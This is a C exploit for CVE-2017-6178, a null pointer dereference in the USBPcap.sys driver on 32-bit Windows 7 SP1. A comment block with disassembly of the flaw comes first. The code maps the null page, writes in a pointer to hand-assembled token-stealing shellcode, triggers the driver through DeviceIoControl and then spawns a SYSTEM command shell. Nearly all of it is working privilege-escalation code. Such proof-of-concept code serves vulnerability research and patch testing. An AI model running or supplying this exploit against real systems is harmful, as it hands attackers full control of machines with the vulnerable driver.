/*
 
Exploit Title    - USBPcap Null Pointer Dereference Privilege Escalation
Date             - 07th March 2017
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://desowin.org/usbpcap/ 
Tested Version   - 1.1.0.0  (USB Packet capture for Windows bundled with WireShark 2.2.5)
Driver Version   - 1.1.0.0 - USBPcap.sys
Tested on OS     - 32bit Windows 7 SP1 
CVE ID           - CVE-2017-6178
Vendor fix url   - not yet
Fixed Version    - 0day
Fixed driver ver - 0day
 
 
USBPcap.sys
-----------
 
.text:992AF494 loc_992AF494:                                                         
.text:992AF494                 mov     ecx, [edi+8]                                  ; DeviceObject
.text:992AF494                                                                       
.text:992AF497                 inc     byte ptr [esi+23h]
.text:992AF49A                 add     dword ptr [esi+60h], 24h
.text:992AF49E                 mov     edx, esi                                      ; Irp
.text:992AF4A0                 call    ds:IofCallDriver                              ; IofCallDriver function called without validating values !!!
.text:992AF4A6                 push    18h                                           ; RemlockSize
.text:992AF4A8                 push    esi                                           ; Tag
.text:992AF4A9                 push    ebx                                           ; RemoveLock
.text:992AF4AA                 mov     edi, eax
.text:992AF4AC                 call    ds:IoReleaseRemoveLockEx
.text:992AF4B2                 mov     eax, edi
 
 
 
kd> u nt!IofCallDriver
.
.
.
82a7111b eb0c            jmp     nt!IofCallDriver+0x63 (82a71129)
82a7111d 8b4608          mov     eax,dword ptr [esi+8] ds:0023:00000008=????????        <------------ null pointer dereference
82a71120 52              push    edx
82a71121 0fb6c9          movzx   ecx,cl
82a71124 56              push    esi
82a71125 ff548838        call    dword ptr [eax+ecx*4+38h]                              <------------ control flow of execution
82a71129 5e              pop     esi
82a7112a 59              pop     ecx
82a7112b 5d              pop     ebp
82a7112c c3              ret
 
 
*/
 
 
 
#include <stdio.h>
#include <windows.h>
 
#define BUFSIZE 4096
 
 
typedef NTSTATUS (WINAPI *_NtAllocateVirtualMemory)(
     IN HANDLE ProcessHandle,
     IN OUT PVOID *BaseAddress,
     IN ULONG ZeroBits,
     IN OUT PULONG RegionSize,
     IN ULONG AllocationType,
     IN ULONG Protect);
 
 
 
// Windows 7 SP1
 
#define W7_KPROCESS 0x50      // Offset to _KPROCESS from a _ETHREAD struct
#define W7_TOKEN    0xf8      // Offset to TOKEN from the _EPROCESS struct
#define W7_UPID     0xb4      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define W7_APLINKS  0xb8      // Offset to ActiveProcessLinks _EPROCESS struct
 
 
BYTE token_steal_w7[] =
{
  0x60,                                                  // pushad                         Saves all registers
  0x64,0xA1,0x24,0x01,0x00,0x00,                         // mov eax, fs:[eax+124h]         Retrieve ETHREAD
  0x8b,0x40,W7_KPROCESS,                                 // mov eax, [eax+W7_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax                   Current _EPROCESS structure
  0x8b,0x98,W7_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+W7_TOKEN]        Retrieves TOKEN
  0x8b,0x80,W7_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+W7_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,W7_APLINKS,0x00,0x00,0x00,                   // sub eax, W7_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,W7_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+W7_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                     ---- 
  0x8b,0x90,W7_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+W7_TOKEN]        Retrieves TOKEN and stores on EDX
  0x89,0x91,0xF8,0x00,0x00,0x00,                         // mov [ecx+W7_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x61,                                                  // popad                          Restores all registers
  0x83,0xc4,0x18,                                        // add esp,18
  0xc3                                                   // ret 
};
 
 
 
 
 
void spawnShell()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
 
 
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
 
    si.cb          = sizeof(si); 
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
 
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
       printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
       return;
    }
 
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
 
 
 
int main(int argc, char *argv[]) 
{
 
    _NtAllocateVirtualMemory    NtAllocateVirtualMemory;
    LPVOID                      addrtoshell;
    NTSTATUS                    allocstatus;
    LPVOID                      base_addr = (LPVOID)0x00000001;                     
    DWORD                       written;
    int                         rwresult;
    int                         size = BUFSIZE; 
    HANDLE                      hDevice;
    DWORD                       dwRetBytes = 0;    
    unsigned char               buffer[BUFSIZE];    
    unsigned char               devhandle[MAX_PATH]; 
 
 
 
    printf("-------------------------------------------------------------------------------\n");
    printf("           USBPCAP (usbpcap.sys) Null Pointer Dereference EoP Exploit          \n");
    printf("                        Tested on Windows 7 SP1 (32bit)                        \n");
    printf("-------------------------------------------------------------------------------\n\n");
 
 
    sprintf(devhandle, "\\\\.\\%s", "usbpcap1");
 
    addrtoshell = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
    if(addrtoshell == NULL)
    {
        printf("[-] VirtualAlloc memory allocation failure %.8x\n\n", GetLastError());
        return -1;
    }
    printf("[+] VirtualAlloc memory allocated at %p\n", addrtoshell);
 
    memcpy(addrtoshell, token_steal_w7, sizeof(token_steal_w7));
    printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_w7));
 
    NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
     
    if (!NtAllocateVirtualMemory)
    {
        printf("[-] Unable to resolve NtAllocateVirtualMemory\n");
        return -1;  
    }
 
    printf("[+] NtAllocateVirtualMemory [0x%p]\n", NtAllocateVirtualMemory);
    printf("[+] Allocating memory at [0x%p]\n", base_addr);
      
    allocstatus = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &base_addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
    if (allocstatus) 
    {
        printf("[-] An error occured while mapping executable memory (0x%08x) %d\n\n", allocstatus, GetLastError());
        return -1;
    }
    printf("[+] NtAllocateVirtualMemory successful\n");
 
    memset(buffer, 0x00, BUFSIZE);
    memcpy(buffer+0x0000006b, &addrtoshell, 4);
 
    rwresult = WriteProcessMemory(INVALID_HANDLE_VALUE, (LPVOID)0x00000001, buffer, BUFSIZE, &written);
 
    if (rwresult == 0)
    {
        printf("[-] An error occured while mapping writing memory: %d\n", GetLastError());
        return -1;
    }
    printf("[+] WriteProcessMemory %d bytes written\n", written);  
 
    printf("[+] Device handle %s\n", devhandle);
     
    hDevice = CreateFile(devhandle, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
     
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile open %s device failed (%d)\n\n", devhandle, GetLastError());
        return -1;
    }
    else
    {
        printf("[+] Open %s device successful\n", devhandle);
    }
 
    printf("[~] Press any key to send Exploit  . . .\n");
    getch();
 
    DeviceIoControl(hDevice, 0x00090028, NULL, 0, NULL, 0, &dwRetBytes, NULL);
 
    CloseHandle(hDevice);
 
    printf("[+] Spawning SYSTEM Shell\n");
    spawnShell();
 
    return 0;
}